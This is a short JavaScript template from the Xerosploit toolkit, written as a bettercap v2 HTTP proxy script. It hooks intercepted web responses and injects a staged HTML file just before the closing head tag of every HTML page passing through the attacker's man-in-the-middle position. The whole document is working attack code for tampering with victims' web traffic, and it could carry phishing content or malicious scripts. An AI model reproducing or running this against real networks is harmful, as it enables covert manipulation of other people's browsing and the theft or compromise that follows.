// Xerosploit injecthtml template for bettercap v2 (http.proxy.script).
// __HTML_FILE__ is replaced by xerosploit.py with the staged HTML file path.
function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ){
      res.Body = body.replace('</head>', readFile('__HTML_FILE__') + '</head>');
    }
  }
}
